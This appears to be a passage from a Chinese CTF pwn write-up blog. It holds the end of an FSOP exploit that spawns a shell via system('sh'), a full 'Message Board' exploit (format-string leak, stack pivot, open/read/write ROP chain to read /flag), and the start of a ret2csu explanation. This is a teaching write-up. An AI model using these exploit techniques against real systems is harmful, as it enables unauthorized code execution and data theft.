class="hljs-number">0</span>)  <span class="hljs-comment"># _cur_column</span><br>    fake_file += p8(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _vtable_offset</span><br>    fake_file += p8(<span class="hljs-number">0x10</span>)  <span class="hljs-comment"># _shortbuf</span><br>    fake_file += p32(<span class="hljs-number">0</span>)<br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _lock</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _offset</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _codecvt</span><br>    fake_file += p64(_wide_data)  <span class="hljs-comment"># _wide_data</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _freeres_list</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _freeres_buf</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># __pad5</span><br>    fake_file += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _mode</span><br>    fake_file += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># unused2</span><br>    fake_file += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>  <span class="hljs-comment"># unused2</span><br>    fake_file += p64(vtable)  <span class="hljs-comment"># vtable</span><br>    <span class="hljs-keyword">return</span> fake_file<br><br><br><span class="hljs-comment">#------------------------   ----------------------------</span><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br><br>_IO_list_all = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>) , <span class="hljs-number">16</span>)<br>libc_base = _IO_list_all - libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>heap_base = libc_base - <span class="hljs-number">0x204000</span><br><br>lg(<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>)<br><br>sla(<span class="hljs-string">&quot;the gift?&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x200000</span>))<br><br><span class="hljs-comment"># dbg();pau()</span><br>_IO_wfile_jumps = libc_base + libc.sym[<span class="hljs-string">&quot;_IO_wfile_jumps&quot;</span>]<br><br><br>fs = FileStructure()<br>fs.flags = <span class="hljs-string">b&quot;  sh;&quot;</span><br>fs.vtable = libc.sym[<span class="hljs-string">&quot;_IO_wfile_jumps&quot;</span>]<br>fs._wide_data = heap_addr+<span class="hljs-number">0x110</span><br>fs._IO_write_ptr = <span class="hljs-number">1</span><br>fs._IO_write_base = <span class="hljs-number">0</span><br><br>payload = flat(&#123;<br>    <span class="hljs-number">0x0</span>: <span class="hljs-built_in">bytes</span>(fs),<br>    <span class="hljs-number">0x100</span>: &#123;<br>        <span class="hljs-number">0x18</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-number">0x30</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-number">0xe0</span>: heap_addr + <span class="hljs-number">0x210</span><br>    &#125;,<br>    <span class="hljs-number">0x200</span>: &#123;<br>        <span class="hljs-number">0x68</span>: libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>    &#125;<br>&#125;, filler = <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br><br>sa(<span class="hljs-string">&quot;gitf?&quot;</span>, payload+<span class="hljs-string">b&quot;\n&quot;</span>)<br><br><br>pi()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二月复现笔记</title>
    <link href="/2023/03/03/%E4%BA%8C%E6%9C%88%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/03/03/%E4%BA%8C%E6%9C%88%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="②西湖论剑"><a href="#②西湖论剑" class="headerlink" title="②西湖论剑"></a>②西湖论剑</h1><h2 id="1-Message-Board"><a href="#1-Message-Board" class="headerlink" title="1.Message Board"></a>1.Message Board</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><strong>前置</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">chen@chen:~/桌面/match/XI_HU/Message</span> <span class="hljs-string">Board$</span> <span class="hljs-string">checksec</span> <span class="hljs-string">./pwn</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/chen/桌面/match/XI_HU/Message Board/pwn&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br>    <br><span class="hljs-string">chen@chen:~/桌面/match/XI_HU/Message</span> <span class="hljs-string">Board$</span> <span class="hljs-string">seccomp-tools</span> <span class="hljs-string">dump</span> <span class="hljs-string">./pwn</span><br> <span class="hljs-string">line</span>  <span class="hljs-string">CODE</span>  <span class="hljs-string">JT</span>   <span class="hljs-string">JF</span>      <span class="hljs-string">K</span><br><span class="hljs-string">=================================</span><br> <span class="hljs-attr">0000:</span> <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  <span class="hljs-string">A</span> <span class="hljs-string">=</span> <span class="hljs-string">arch</span><br> <span class="hljs-attr">0001:</span> <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-string">if</span> <span class="hljs-string">(A</span> <span class="hljs-type">!=</span> <span class="hljs-string">ARCH_X86_64)</span> <span class="hljs-string">goto</span> <span class="hljs-number">0007</span><br> <span class="hljs-attr">0002:</span> <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-string">A</span> <span class="hljs-string">=</span> <span class="hljs-string">sys_number</span><br> <span class="hljs-attr">0003:</span> <span class="hljs-number">0x35</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x40000000</span>  <span class="hljs-string">if</span> <span class="hljs-string">(A</span> <span class="hljs-string">&lt;</span> <span class="hljs-number">0x40000000</span><span class="hljs-string">)</span> <span class="hljs-string">goto</span> <span class="hljs-number">0005</span><br> <span class="hljs-attr">0004:</span> <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0xffffffff</span>  <span class="hljs-string">if</span> <span class="hljs-string">(A</span> <span class="hljs-type">!=</span> <span class="hljs-number">0xffffffff</span><span class="hljs-string">)</span> <span class="hljs-string">goto</span> <span class="hljs-number">0007</span><br> <span class="hljs-attr">0005:</span> <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000003b</span>  <span class="hljs-string">if</span> <span class="hljs-string">(A</span> <span class="hljs-string">==</span> <span class="hljs-string">execve)</span> <span class="hljs-string">goto</span> <span class="hljs-number">0007</span><br> <span class="hljs-attr">0006:</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-string">return</span> <span class="hljs-string">ALLOW</span><br> <span class="hljs-attr">0007:</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-string">return</span> <span class="hljs-string">KILL</span><br></code></pre></td></tr></table></figure><p><strong>ban了一个execve，通过orw</strong></p><p><strong>逆向</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  <span class="hljs-type">char</span> *v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-C0h] BYREF</span><br>  <span class="hljs-type">char</span> dest[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+8h] [rbp-B8h] BYREF</span><br>  <span class="hljs-type">char</span> v7[<span class="hljs-number">176</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-B0h] BYREF</span><br><br>  init_sandbox();<br>  <span class="hljs-keyword">if</span> ( !dword_4040AC )<br>  &#123;<br>    <span class="hljs-built_in">strcpy</span>(dest, <span class="hljs-string">&quot;Hello, &quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to DASCTF message board, please leave your name:&quot;</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>    dword_4040AC = <span class="hljs-number">1</span>;<br>  &#125;<br>  v3 = <span class="hljs-built_in">strcat</span>(dest, buf);<br>  <span class="hljs-built_in">printf</span>(v3);  <span class="hljs-comment">//栈上的格式化字符串漏洞，输入长度8字节,泄露libc</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now, please say something to DASCTF:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, v7, <span class="hljs-number">0xC0</span>uLL); <span class="hljs-comment">//0x10栈溢出，栈迁移，做ret2syscall--orw</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Posted Successfully~&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>偏移：6</strong></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li><strong>第一次输入：fmt：leak_libc 以及 栈地址</strong></li><li><strong>第二次输入：字符串位于泄露出的栈地址+0x10处</strong></li><li><strong>布栈：ret2syscall的方法，布置ORW链</strong></li><li><strong>栈迁移，实现再次写，rsi由rbp索引</strong></li><li><strong>栈迁移回栈上，执行ROP链</strong></li></ol><h4 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">call foo<br>;push rip+8<br>;mov foo_addr, rip<br><br>foo<br>;push rbp<br>;mov rbp,rsp<br><br>leave<br>;mov rsp, rbp<br>;pop rbp<br><br>ret<br>;pop rip<br><br></code></pre></td></tr></table></figure><p>函数调用开始，和末尾的leave_ret是两个相反的过程</p><p>如果存在溢出0x10字节，意味着可以控制rbp，将ret篡改为leave_ret这一gadget，程序的末尾即是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">leave <br>;mov rsp, rbp<br>;pop rbp<br><br>leave<br>;mov rsp, rbp<br>;pop rbp<br><br>ret<br>;pop rip<br></code></pre></td></tr></table></figure><p><strong>流程</strong></p><p><strong>栈溢出篡改rbp , ret</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">rbp: Hack_addr - 0x8<br>ret: leave_ret<br></code></pre></td></tr></table></figure><h4 id="本题"><a href="#本题" class="headerlink" title="本题"></a>本题</h4><p><strong>第二次输入位置：stack_addr - 0xb0</strong></p><p><code>stack_addr：0x7ffded449570</code></p><p><code>stack_addr - 0xb0：0x7ffded4494c0 ◂— 0x67616c662f /* &#39;/flag&#39; */</code></p><p><strong>栈迁移位置：stack_addr - 0xb0 + 0x8</strong></p><p>因为此处是先填入0x8字节的内容，所以栈迁移地址直接写到此处即可</p><p>(其他情况下，放在目标地址-0x8处)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00:0000│ rsp 0x7ffded4494a8 —▸ 0x401391 ◂— lea    rdi, [rip + 0xcd5]<br>01:0008│     0x7ffded4494b0 ◂— 0x70243133257025 /* &#x27;%p%31$p&#x27; */<br>02:0010│     0x7ffded4494b8 ◂— &#x27;Hello, %p%31$p&#x27;<br>03:0018│ rsi 0x7ffded4494c0 ◂— 0x702431332570 /* &#x27;p%31$p&#x27; */<br>04:0020│     0x7ffded4494c8 ◂— 0x0<br>... ↓        3 skipped<br><br><br><br>00:0000│ rsp 0x7ffded4494b0 ◂— 0x70243133257025 /* &#x27;%p%31$p&#x27; */<br>01:0008│     0x7ffded4494b8 ◂— &#x27;Hello, %/flag&#x27;<br>02:0010│ rsi 0x7ffded4494c0 ◂— 0x67616c662f /* &#x27;/flag&#x27; */<br>03:0018│     0x7ffded4494c8 —▸ 0x7fe6c983bb6a (init_cacheinfo+234) ◂— pop    rdi<br>04:0020│     0x7ffded4494d0 —▸ 0x7ffded4494c0 ◂— 0x67616c662f /* &#x27;/flag&#x27; */<br>05:0028│     0x7ffded4494d8 —▸ 0x7fe6c983e01f (__gconv_close_transform+239) ◂— pop    rsi<br>06:0030│     0x7ffded4494e0 ◂— 0x0<br>07:0038│     0x7ffded4494e8 —▸ 0x7fe6c9925ce0 (open64) ◂— endbr64 <br><br><br><br></code></pre></td></tr></table></figure><p><strong>leave_ret_gadget</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">00000000004012E1</span> C9                            leave<br>.text:<span class="hljs-number">00000000004012E2</span> C3                            retn<br></code></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: &lt;encoding name&gt; -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br>banary = <span class="hljs-string">&quot;./pwn&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span><br>port = <span class="hljs-number">25994</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_after_clean</span>(<span class="hljs-params">content: <span class="hljs-built_in">bytes</span> = <span class="hljs-string">b&quot;&quot;</span>, until: <span class="hljs-built_in">bytes</span> = <span class="hljs-literal">None</span>,\</span><br><span class="hljs-params">                     timeout: <span class="hljs-built_in">float</span> = <span class="hljs-number">0.05</span>, no_show: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">True</span></span>):<br><span class="hljs-keyword">if</span> until <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>p.recvuntil(flat(until))<br><span class="hljs-keyword">else</span>:<br>        received = p.clean(timeout)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> no_show:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[$]received:\n<span class="hljs-subst">&#123;received.decode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>)&#125;</span>&quot;</span>)<br>p.send(flat(content))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sendline_after_clean</span>(<span class="hljs-params">content: <span class="hljs-built_in">bytes</span> = <span class="hljs-string">b&quot;&quot;</span>, until: <span class="hljs-built_in">bytes</span> = <span class="hljs-literal">None</span>,\</span><br><span class="hljs-params">                         timeout: <span class="hljs-built_in">float</span> = <span class="hljs-number">0.05</span>, no_show: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">True</span></span>):<br>send_after_clean([content, p.newline], until, timeout, no_show)<br><br><br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#--------------------1.leak_libc &amp; stack-------------------</span><br>payload1 = <span class="hljs-string">b&#x27;%p%31$p&#x27;</span><br>sa(<span class="hljs-string">b&#x27;name:&#x27;</span>, payload1)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Hello, &#x27;</span>)<br><br>stack_addr= <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) + <span class="hljs-number">0xc0</span>  <span class="hljs-comment">#rbp</span><br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>)<br>libc_base= <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]- <span class="hljs-number">243</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><br><span class="hljs-comment">#--------------------2.Gadget----------------------------</span><br>open_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>puts_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>offset_2 =libc.search(asm(<span class="hljs-string">&#x27;pop rdx;ret&#x27;</span>)).__next__() <span class="hljs-comment">#0x1c9a---BUG</span><br>lg(<span class="hljs-string">&#x27;offset_2&#x27;</span>) <br><br>pop_rdi_ret = <span class="hljs-number">0x0000000000401413</span><br>pop_rsi_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rsi; ret&#x27;</span>)).__next__()<br>pop_rdx_ret = libc_base + <span class="hljs-number">0x142c92</span><br><br><br>flag = stack_addr - <span class="hljs-number">0xb0</span> <br>leave_ret = <span class="hljs-number">0x00000000004012e1</span><br><br>lg(<span class="hljs-string">&#x27;read_addr&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;open_addr&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;write_addr&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;pop_rdi_ret&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;pop_rsi_ret&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;pop_rdx_ret&#x27;</span>)<br><br><span class="hljs-comment">#--------------------3.ORW------------------------------</span><br>orw_payload = <span class="hljs-string">b&#x27;/flag\0\0\0&#x27;</span><br>orw_payload += p64(pop_rdi_ret)+ p64(flag) +p64(pop_rsi_ret)+ p64(<span class="hljs-number">0</span>) + p64(open_addr)<br>orw_payload += p64(pop_rdi_ret)+ p64(<span class="hljs-number">3</span>)+ p64(pop_rsi_ret)+ p64(stack_addr+<span class="hljs-number">0x90</span>)+ p64(pop_rdx_ret) + p64(<span class="hljs-number">0x30</span>)+ p64(read_addr)<br>orw_payload += p64(pop_rdi_ret)+ p64(<span class="hljs-number">1</span>)+p64(pop_rsi_ret)+ p64(stack_addr+<span class="hljs-number">0x90</span>)+ p64(pop_rdx_ret)+ p64(<span class="hljs-number">0x30</span>)+ p64(write_addr)<br><br><span class="hljs-comment">#--------------------4.Stack_pivot &amp; PWN----------------------</span><br>payload2 = orw_payload.ljust(<span class="hljs-number">0xb0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) + p64(flag)+ p64(leave_ret)<br>sa(<span class="hljs-string">b&#x27;DASCTF:&#x27;</span>,payload2)<br><br>pi() <br></code></pre></td></tr></table></figure><h2 id="2-babycalc"><a href="#2-babycalc" class="headerlink" title="2.babycalc"></a>2.babycalc</h2><h3 id="re2csu"><a href="#re2csu" class="headerlink" title="re2csu"></a>re2csu</h3><p>ret2csu的目的是可以通过gadget，控制所有寄存器，直接实现一个函数的使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#Gadget1<br>.text:0000000000400C96                               loc_400C96:                             ; CODE XREF: init+34↑j<br>.text:0000000000400C96 48 83 C4 08                   add     rsp, 8<br><br>.text:0000000000400C9A 5B                            pop     rbx<br>.text:0000000000400C9B 5D                            pop     rbp<br>.text:0000000000400C9C 41 5C                         pop     r12<br>.text:0000000000400C9E 41 5D                         pop     r13<br>.text:0000000000400CA0 41 5E                         pop     r14<br>.text:0000000000400CA2 41 5F                         pop     r15<br>.text:0000000000400CA4 C3                            retn<br><br>#Gadget2<br>.text:0000000000400C80                               loc_400C80:                             ; CODE XREF: init+54↓j<br>.text:0000000000400C80 4C 89 EA                      mov     rdx, r13<br>.text:0000000000400C83 4C 89 F6                      mov     rsi, r14<br>.text:0000000000400C86 44 89 FF                      mov     edi, r15d<br>.text:0000000000400C89 41 FF 14 DC                   call    qword ptr [r12+rbx*8]<br>.text:0000000000400C89<br>.text:0000000000400C8D 48 83 C3 01                   add     rbx, 1<br>.text:0000000000400C91 48 39 EB                      cmp     rbx, rbp<br>.text:0000000000400C94 75 EA                         jnz     short loc_400C80<br>.text:0000000000400C94<br></code></pre></td></tr></table></figure><p><strong>python代码–write(1,write_got,8)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">csu_one_addr =<span class="hljs-number">0x400C96</span><br>csu_second_addr =  <span class="hljs-number">0x400C80</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rbx, rbp, r12, r13, r14, r15, last</span>):<br>    <span class="hljs-comment"># pop rbx,rbp,r12,r13,r14,r15</span><br>    <span class="hljs-comment"># rbx = 0,</span><br>    <span class="hljs-comment"># rbp = 1, not to jump</span><br>    <span class="hljs-comment"># r12 = 目标函数地址</span><br>    <span class="hljs-comment"># rdi = edi=r15d</span><br>    <span class="hljs-comment"># rsi = r14</span><br>    <span class="hljs-comment"># rdx = r13</span><br>    <br>    <span class="hljs-comment">#第一个段0x80+fake_ebp是偏移量(视题目而定)，第二个0x38是让程序流重新回到ret位置</span><br>    payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x80</span> + fake_ebp<br>    payload += p64(csu_one_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)<br>    payload += p64(csu_second_addr)<br>    payload += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br>    payload += p64(last)<br>    sh.send(payload)<br>    sleep(<span class="hljs-number">1</span>)<br>    <br><span class="hljs-comment"># write(1,write_got,8)</span><br><span class="hljs-comment">#实际:RBX=0, RBP=1 